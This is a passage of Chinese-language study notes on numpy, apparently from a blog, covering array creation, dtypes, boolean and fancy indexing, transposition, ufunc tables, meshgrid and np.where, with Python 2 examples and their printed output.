            <h1 id="chapter-1"><a href="#chapter-1" class="headerlink" title="chapter 1"></a>chapter 1</h1><h2 id="基本import"><a href="#基本import" class="headerlink" title="基本import"></a>基本import</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure>
<h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h1 id="Chapter-3-python"><a href="#Chapter-3-python" class="headerlink" title="Chapter 3: python"></a>Chapter 3: python</h1><h1 id="Chapter-4-numpy"><a href="#Chapter-4-numpy" class="headerlink" title="Chapter 4: numpy"></a>Chapter 4: numpy</h1><h2 id="创建ndarray"><a href="#创建ndarray" class="headerlink" title="创建ndarray"></a>创建ndarray</h2><h3 id="arange"><a href="#arange" class="headerlink" title="arange"></a>arange</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.options.display.notebook_repr_html = <span class="literal">False</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data1 =[<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">arr1 = np.array(data1)</span><br><span class="line">arr1</span><br><span class="line"><span class="keyword">print</span> data1 * <span class="number">2</span> <span class="comment">#list 会变成重复数组</span></span><br><span class="line"><span class="keyword">print</span> arr1 * <span class="number">2</span> <span class="comment"># array会传播进行运算</span></span><br><span class="line"><span class="comment">#print data1 + 2 #会报错</span></span><br><span class="line"><span class="keyword">print</span> arr1 + <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> arr1.ndim <span class="comment">#维度</span></span><br><span class="line"><span class="keyword">print</span> arr1.shape</span><br><span class="line"><span class="keyword">print</span> arr1.reshape(<span class="number">5</span>,<span class="number">1</span>).shape</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#+RESULTS:</span><br><span class="line">    : [6, 7, 8, 0, 1, 6, 7, 8, 0, 1]</span><br><span class="line">    : [12 14 16  0  2]</span><br><span class="line">    : [ 8  9 10  2  3]</span><br><span class="line">    : 1</span><br><span class="line">    : (5,)</span><br><span class="line">    : (5, 1)</span><br></pre></td></tr></table></figure>
<h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>array</td>
<td>创造array</td>
</tr>
<tr>
<td>asarray</td>
<td>转换成array</td>
</tr>
<tr>
<td>arange</td>
<td>类似于range</td>
</tr>
<tr>
<td>ones</td>
<td>全部为1的array，参数为shape</td>
</tr>
<tr>
<td>ones~like~</td>
<td>参数为array类型</td>
</tr>
<tr>
<td>zeros</td>
<td>类似于 ones</td>
</tr>
<tr>
<td>zeros~like~</td>
<td>类似于 ones~like~</td>
</tr>
<tr>
<td>empty</td>
<td>类似于 ones</td>
</tr>
<tr>
<td>empty~like~</td>
<td>类似于 ones~like~</td>
</tr>
<tr>
<td>eye</td>
<td>创建一个单位矩阵，参数为int</td>
</tr>
<tr>
<td>identity</td>
<td>like eye</td>
</tr>
<tr>
<td>meshgrid</td>
<td><strong>参数为两个一维数组，产生两个二维矩阵（对应两个数组中所有（x,y）对）</strong></td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<pre><code>a = np.identity(3)
print(a)
a = np.ones_like(a)
print(a)
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    #+RESULTS:</span><br><span class="line">: [[ 1.  0.  0.]</span><br><span class="line">:  [ 0.  1.  0.]</span><br><span class="line">:  [ 0.  0.  1.]]</span><br><span class="line">: [[ 1.  1.  1.]</span><br><span class="line">:  [ 1.  1.  1.]</span><br><span class="line">:  [ 1.  1.  1.]]</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>缩写</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>int8</td>
<td>i1</td>
<td>有符号8位int</td>
</tr>
<tr>
<td>uint8</td>
<td>u1</td>
<td>无符号8位int</td>
</tr>
<tr>
<td>int16</td>
<td>i2</td>
<td></td>
</tr>
<tr>
<td>uint16</td>
<td>u2</td>
<td></td>
</tr>
<tr>
<td>int32</td>
<td>i4</td>
<td></td>
</tr>
<tr>
<td>unit32</td>
<td>u4</td>
<td></td>
</tr>
<tr>
<td>int64</td>
<td>i8</td>
<td></td>
</tr>
<tr>
<td>uint64</td>
<td>u8</td>
<td></td>
</tr>
<tr>
<td>float16</td>
<td>f2</td>
<td>半精度浮点数</td>
</tr>
<tr>
<td>float32</td>
<td>f4 or f</td>
<td>标准单精度浮点数，与C的float兼容</td>
</tr>
<tr>
<td>float64</td>
<td>f8 or d</td>
<td>双精度，C的double和python的float兼容</td>
</tr>
<tr>
<td>float128</td>
<td>f16 or g</td>
<td>扩展精度浮点数</td>
</tr>
<tr>
<td>complex64</td>
<td>c8</td>
<td>用两个32位浮点数表示的复数</td>
</tr>
<tr>
<td>complex128</td>
<td>c16</td>
<td></td>
</tr>
<tr>
<td>complex256</td>
<td>c32</td>
<td></td>
</tr>
<tr>
<td>bool</td>
<td>?</td>
<td>储存True和False值的布尔类型</td>
</tr>
<tr>
<td>object</td>
<td>O</td>
<td>python对象类型</td>
</tr>
<tr>
<td>string_</td>
<td>S</td>
<td>固定长度的字符（每个字符1个字节）长度为10的字符串，应使用S10</td>
</tr>
<tr>
<td>unicode_</td>
<td>U</td>
<td>固定长度的unicode</td>
</tr>
</tbody>
</table>
</div>
<h3 id="数据类型转换astype"><a href="#数据类型转换astype" class="headerlink" title="数据类型转换astype"></a>数据类型转换astype</h3><ol>
<li>参数为数据类型</li>
</ol>
<h3 id="查看数据类型"><a href="#查看数据类型" class="headerlink" title="查看数据类型"></a>查看数据类型</h3><ol>
<li>array的自带属性dtype</li>
</ol>
<h2 id="索引和切片"><a href="#索引和切片" class="headerlink" title="索引和切片"></a>索引和切片</h2><h3 id="切片是原始数据的视图，而不是复制，修改会反映到原数组上-注意点-lt-span-gt-切片是原始数据的视图而不是复制修改会反映到原数组上"><a href="#切片是原始数据的视图，而不是复制，修改会反映到原数组上-注意点-lt-span-gt-切片是原始数据的视图而不是复制修改会反映到原数组上" class="headerlink" title="切片是原始数据的视图，而不是复制，修改会反映到原数组上 注意点&lt;/span&gt; [切片是原始数据的视图而不是复制修改会反映到原数组上]"></a><strong>切片是原始数据的视图，而不是复制，修改会反映到原数组上</strong> <span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt; [切片是原始数据的视图而不是复制修改会反映到原数组上]</span></h3><h3 id="新的表示方法"><a href="#新的表示方法" class="headerlink" title="新的表示方法"></a>新的表示方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = np.arange(<span class="number">15</span>).reshape(<span class="number">3</span>,<span class="number">5</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(a[<span class="number">2</span>][<span class="number">3</span>]) <span class="comment">#原本的表示方法</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(a[<span class="number">2</span>,<span class="number">3</span>])  <span class="comment">#numpy新增的表示方法</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> a[[<span class="number">2</span>,<span class="number">1</span>]] <span class="comment">#花式索引</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[[ 0  1  2  3  4]</span><br><span class="line"> [ 5  6  7  8  9]</span><br><span class="line"> [10 11 12 13 14]]</span><br><span class="line"></span><br><span class="line">13</span><br><span class="line"></span><br><span class="line">13</span><br><span class="line"></span><br><span class="line">[[10 11 12 13 14]</span><br><span class="line"> [ 5  6  7  8  9]]</span><br></pre></td></tr></table></figure>
<h3 id="布尔型索引"><a href="#布尔型索引" class="headerlink" title="布尔型索引"></a>布尔型索引</h3><ol>
<li><p>否定符号 != / -</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">names = np.array([<span class="string">"Bob"</span>,<span class="string">"Joe"</span>, <span class="string">'Will'</span>, <span class="string">'Bob'</span>, <span class="string">"Will"</span>,<span class="string">'Joe'</span>,<span class="string">'Joe'</span>])</span><br><span class="line">data = np.random.randn(<span class="number">7</span>,<span class="number">4</span>)</span><br><span class="line">print(names)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(data)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(data[names == <span class="string">"Bob"</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(data[names != <span class="string">"Bob"</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(data[-(names == <span class="string">'Bob'</span>)]) <span class="comment">#numpy 新的表示方法</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[&apos;Bob&apos; &apos;Joe&apos; &apos;Will&apos; &apos;Bob&apos; &apos;Will&apos; &apos;Joe&apos; &apos;Joe&apos;]</span><br><span class="line"></span><br><span class="line">[[ -1.06602469e+00   1.70960938e+00  -5.37441602e-01  -1.26864579e+00]</span><br><span class="line"> [  6.83392505e-01  -3.65908339e-01  -1.07189314e+00   1.78582204e+00]</span><br><span class="line"> [ -1.06516810e+00   1.74430728e+00   5.88376963e-01   1.59791560e-01]</span><br><span class="line"> [ -1.96586484e-01   1.14215100e-04  -7.00807814e-01  -1.75005941e-01]</span><br><span class="line"> [  9.63746755e-01  -4.51637875e-01  -1.78610575e+00   6.75211511e-01]</span><br><span class="line"> [ -6.90968770e-01   5.80293483e-01   7.34267063e-01   4.58773330e-01]</span><br><span class="line"> [ -1.36539167e-01   1.90051999e+00  -1.13351041e+00   7.74997645e-01]]</span><br><span class="line"></span><br><span class="line">[[ -1.06602469e+00   1.70960938e+00  -5.37441602e-01  -1.26864579e+00]</span><br><span class="line"> [ -1.96586484e-01   1.14215100e-04  -7.00807814e-01  -1.75005941e-01]]</span><br><span class="line"></span><br><span class="line">[[ 0.6833925  -0.36590834 -1.07189314  1.78582204]</span><br><span class="line"> [-1.0651681   1.74430728  0.58837696  0.15979156]</span><br><span class="line"> [ 0.96374676 -0.45163788 -1.78610575  0.67521151]</span><br><span class="line"> [-0.69096877  0.58029348  0.73426706  0.45877333]</span><br><span class="line"> [-0.13653917  1.90051999 -1.13351041  0.77499765]]</span><br><span class="line"></span><br><span class="line">[[ 0.6833925  -0.36590834 -1.07189314  1.78582204]</span><br><span class="line"> [-1.0651681   1.74430728  0.58837696  0.15979156]</span><br><span class="line"> [ 0.96374676 -0.45163788 -1.78610575  0.67521151]</span><br><span class="line"> [-0.69096877  0.58029348  0.73426706  0.45877333]</span><br><span class="line"> [-0.13653917  1.90051999 -1.13351041  0.77499765]]</span><br><span class="line">/Users/Yueyec/.pyenv/versions/anaconda2-4.3.0/lib/python2.7/site-packages/ipykernel/__main__.py:11: DeprecationWarning: numpy boolean negative, the `-` operator, is deprecated, use the `~` operator or the logical_not function instead.</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="花式索引"><a href="#花式索引" class="headerlink" title="花式索引"></a>花式索引</h3><ol>
<li><p>是复制，不是视图</p>
</li>
<li><p>索引参数是一个list 里面是row index，可重复</p>
</li>
<li><p>参数是二阶list，得到的会是对应的单个元素 <span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt;</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">32</span>).reshape((<span class="number">8</span>,<span class="number">4</span>))</span><br><span class="line">print(arr)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(arr[[<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>],[<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]]) <span class="comment">#会得到arr[1,0],arr[5,3],arr[7,1],arr[2,2]的一阶array</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#第一种方法</span></span><br><span class="line">print(arr[[<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>]][:,[<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">print(arr[np.ix_([<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>],[<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>])]) <span class="comment">#np.ix_将两个一维整数数组转换成一个用于区域的索引器</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[[ 0  1  2  3]</span><br><span class="line"> [ 4  5  6  7]</span><br><span class="line"> [ 8  9 10 11]</span><br><span class="line"> [12 13 14 15]</span><br><span class="line"> [16 17 18 19]</span><br><span class="line"> [20 21 22 23]</span><br><span class="line"> [24 25 26 27]</span><br><span class="line"> [28 29 30 31]]</span><br><span class="line"></span><br><span class="line">[ 4 23 29 10]</span><br><span class="line"></span><br><span class="line">[[ 4  7  5  6]</span><br><span class="line"> [20 23 21 22]</span><br><span class="line"> [28 31 29 30]</span><br><span class="line"> [ 8 11  9 10]]</span><br><span class="line"></span><br><span class="line">[[ 4  7  5  6]</span><br><span class="line"> [20 23 21 22]</span><br><span class="line"> [28 31 29 30]</span><br><span class="line"> [ 8 11  9 10]]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="数组转置和轴对换"><a href="#数组转置和轴对换" class="headerlink" title="数组转置和轴对换"></a>数组转置和轴对换</h3><ol>
<li><p>转置为视图，非复制,但是不改变实例本身（self）的结构</p>
</li>
<li><p>T属性</p>
<ol>
<li>轴颠倒</li>
</ol>
</li>
<li><p>transpose()方法 <span class="tag" tag-name="没明白"><span class="smallcaps">没明白</span>&lt;/span&gt;</span></p>
<ol>
<li><p>参数为由轴编号组成的元组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">16</span>).reshape((<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>))</span><br><span class="line">print(arr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"---------------------"</span></span><br><span class="line">print(arr.transpose((<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[[[ 0  1  2  3]</span><br><span class="line">  [ 4  5  6  7]]</span><br><span class="line"></span><br><span class="line"> [[ 8  9 10 11]</span><br><span class="line">  [12 13 14 15]]]</span><br><span class="line">---------------------</span><br><span class="line">[[[ 0  1  2  3]</span><br><span class="line">  [ 8  9 10 11]]</span><br><span class="line"></span><br><span class="line"> [[ 4  5  6  7]</span><br><span class="line">  [12 13 14 15]]]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>swapaxes函数 <span class="tag" tag-name="没明白"><span class="smallcaps">没明白</span>&lt;/span&gt;</span></p>
</li>
</ol>
<h2 id="通用函数"><a href="#通用函数" class="headerlink" title="通用函数"></a>通用函数</h2><h3 id="常用一元函数列表"><a href="#常用一元函数列表" class="headerlink" title="常用一元函数列表"></a>常用一元函数列表</h3><div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>abs</td>
<td>绝对值</td>
</tr>
<tr>
<td>fabs</td>
<td>绝对值,对于非复数值，计算更快</td>
</tr>
<tr>
<td>sqrt</td>
<td>平方根，相当于arr ** 0.5</td>
</tr>
<tr>
<td>square</td>
<td>平方,相当于arr ** 2</td>
</tr>
<tr>
<td>exp</td>
<td>指数 e^x^</td>
</tr>
<tr>
<td>log</td>
<td>自然对数（底数为e）</td>
</tr>
<tr>
<td>log10</td>
<td>底数为10</td>
</tr>
<tr>
<td>log2</td>
<td>底数为2</td>
</tr>
<tr>
<td>log1p</td>
<td>log(1 +x)</td>
</tr>
<tr>
<td>sign</td>
<td>各元素的正负号：1（正数），0（零），-1（负数）</td>
</tr>
<tr>
<td>ceil</td>
<td>ceiling值，即大于等于该数值的最小整数</td>
</tr>
<tr>
<td>floor</td>
<td>floor值，即小于等于该数值的最大整数</td>
</tr>
<tr>
<td>rint</td>
<td>各元素四舍五入到最接近的整数，保留dtype</td>
</tr>
<tr>
<td>modf</td>
<td>数组的小数和整数以两个独立数组的形式返回</td>
</tr>
<tr>
<td>isnan</td>
<td>返回一个表示“哪些值是NaN”的布尔型数组</td>
</tr>
<tr>
<td>isfinite</td>
<td>返回一个表示“那些值是有穷的（非inf，非NaN）”的布尔型数组</td>
</tr>
<tr>
<td>isinf</td>
<td>返回一个表示”哪些值是无穷”的布尔型数组</td>
</tr>
<tr>
<td>cos</td>
<td>三角函数</td>
</tr>
<tr>
<td>cosh</td>
<td>三角函数</td>
</tr>
<tr>
<td>sin</td>
<td>三角函数</td>
</tr>
<tr>
<td>sinh</td>
<td>三角函数</td>
</tr>
<tr>
<td>tan</td>
<td>三角函数</td>
</tr>
<tr>
<td>tanh</td>
<td>三角函数</td>
</tr>
<tr>
<td>arccos</td>
<td>反三角函数</td>
</tr>
<tr>
<td>arccosh</td>
<td>反三角函数</td>
</tr>
<tr>
<td>arcsin</td>
<td>反三角函数</td>
</tr>
<tr>
<td>arcsinh</td>
<td>反三角函数</td>
</tr>
<tr>
<td>arctan</td>
<td>反三角函数</td>
</tr>
<tr>
<td>arctanh</td>
<td>反三角函数</td>
</tr>
<tr>
<td>logical~not~</td>
<td>计算各元素not x的真值，相当于-arr</td>
</tr>
</tbody>
</table>
</div>
<h3 id="常用二元函数列表"><a href="#常用二元函数列表" class="headerlink" title="常用二元函数列表"></a>常用二元函数列表</h3><div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>add</td>
<td>元素相加</td>
</tr>
<tr>
<td>subtract</td>
<td>第一个数组减去第二个数组的元素</td>
</tr>
<tr>
<td>multiply</td>
<td>数组元素相乘</td>
</tr>
<tr>
<td>divide</td>
<td>除法</td>
</tr>
<tr>
<td>floor~divide~</td>
<td>向下园整除法（丢弃余数）</td>
</tr>
<tr>
<td>power</td>
<td>对于第一个数组元素A，第二个数组元素B，计算A** B</td>
</tr>
<tr>
<td>maximum</td>
<td>计算最大值</td>
</tr>
<tr>
<td>fmax</td>
<td>计算最大值（忽略NaN）</td>
</tr>
<tr>
<td>fmin</td>
<td>计算最小值（忽略NaN）</td>
</tr>
<tr>
<td>minimum</td>
<td>计算最小值</td>
</tr>
<tr>
<td>mod</td>
<td>模运算</td>
</tr>
<tr>
<td>copysign</td>
<td>将第二数组中值的符号复制给第一个数组中的值</td>
</tr>
<tr>
<td>greater</td>
<td>相当于 ></td>
</tr>
<tr>
<td>greater~equal~</td>
<td>相当于 >=</td>
</tr>
<tr>
<td>less</td>
<td>相当于 \&lt;</td>
</tr>
<tr>
<td>less~equal~</td>
<td>相当于 \&lt;=</td>
</tr>
<tr>
<td>equal</td>
<td>相当于 ==</td>
</tr>
<tr>
<td>not~equal~</td>
<td>相当于 !=</td>
</tr>
<tr>
<td>logical~and~</td>
<td>相当于 &amp;</td>
</tr>
<tr>
<td>logical~or~</td>
<td>相当于</td>
</tr>
<tr>
<td>logical~xor~</td>
<td>相当于 \^</td>
</tr>
</tbody>
</table>
</div>
<h2 id="利用数组进行数据处理"><a href="#利用数组进行数据处理" class="headerlink" title="利用数组进行数据处理"></a>利用数组进行数据处理</h2><h3 id="假设在一组值（网格型）上计算函数sqrt-x-2-y-2"><a href="#假设在一组值（网格型）上计算函数sqrt-x-2-y-2" class="headerlink" title="假设在一组值（网格型）上计算函数sqrt(x^2^ + y^2^)"></a>假设在一组值（网格型）上计算函数sqrt(x^2^ + y^2^)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = np.arange(<span class="number">5</span>)</span><br><span class="line">b = np.arange(<span class="number">5</span>,<span class="number">9</span>)</span><br><span class="line">xs,ys = np.meshgrid(a, b)</span><br><span class="line">print(xs)  <span class="comment">#xs为a在轴0上广播len(b)次，即4</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'----------'</span></span><br><span class="line">print(ys)  <span class="comment">#ys为b.T在轴1上广播Len(a)次，即5</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[[0 1 2 3 4]</span><br><span class="line"> [0 1 2 3 4]</span><br><span class="line"> [0 1 2 3 4]</span><br><span class="line"> [0 1 2 3 4]]</span><br><span class="line">----------</span><br><span class="line">[[5 5 5 5 5]</span><br><span class="line"> [6 6 6 6 6]</span><br><span class="line"> [7 7 7 7 7]</span><br><span class="line"> [8 8 8 8 8]]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">points = np.arange(<span class="number">-5</span>,<span class="number">5</span>,<span class="number">0.01</span>) <span class="comment">#1000个间隔相等的点</span></span><br><span class="line">xs,ys = np.meshgrid(points, points)</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">z = np.sqrt(xs ** <span class="number">2</span>+ ys ** <span class="number">2</span>)</span><br><span class="line">plt.imshow(z,cmap = plt.cm.gray)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.title(<span class="string">"Image plot of $\sqrt&#123;x^2 + y^2&#125;$ for a grid of values"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h2 id="将条件逻辑表述为数组运算"><a href="#将条件逻辑表述为数组运算" class="headerlink" title="将条件逻辑表述为数组运算"></a>将条件逻辑表述为数组运算</h2><h3 id="numpy-where函数是三元表达式x-if-condition-else-y的矢量化版本"><a href="#numpy-where函数是三元表达式x-if-condition-else-y的矢量化版本" class="headerlink" title="numpy.where函数是三元表达式x if condition else y的矢量化版本"></a>numpy.where函数是三元表达式x if condition else y的矢量化版本</h3><ol>
<li><p>假设这三个变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">xarr = np.array([<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>])</span><br><span class="line">yarr = np.array([<span class="number">2.1</span>, <span class="number">2.2</span>, <span class="number">2.3</span>, <span class="number">2.4</span>, <span class="number">2.5</span>])</span><br><span class="line">cond = np.array([<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>])</span><br></pre></td></tr></table></figure>
</li>
<li><p>假设根据cond的值来选取xarr与yarr的值，当cond为True，选取xarr,否者yarr</p>
<ol>
<li><p>常规做法，对于大数组处理速度不快，无法作用于多维数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = [x <span class="keyword">if</span> c <span class="keyword">else</span> y  <span class="keyword">for</span> x, y, c <span class="keyword">in</span> zip(xarr, yarr, cond)]</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1.1000000000000001, 2.2000000000000002, 1.3, 1.3999999999999999, 2.5]</span><br></pre></td></tr></table></figure>
</li>
<li><p>用where处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = np.where(cond, xarr, yarr)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1.1  2.2  1.3  1.4  2.5]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>复杂的例子</p>
<ol>
<li><p>常规的做法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cond1 = cond</span><br><span class="line">cond2 = np.array([<span class="literal">True</span>,<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cond1)):</span><br><span class="line">    <span class="keyword">if</span> cond1[i] <span class="keyword">and</span> cond2[i]:</span><br><span class="line">        result.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> cond1[i]:</span><br><span class="line">        result.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> cond2[i]:</span><br><span class="line">        result.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result.append(<span class="number">3</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 3, 1, 0, 2]</span><br></pre></td></tr></table></figure>
</li>
<li><p>用where</p>
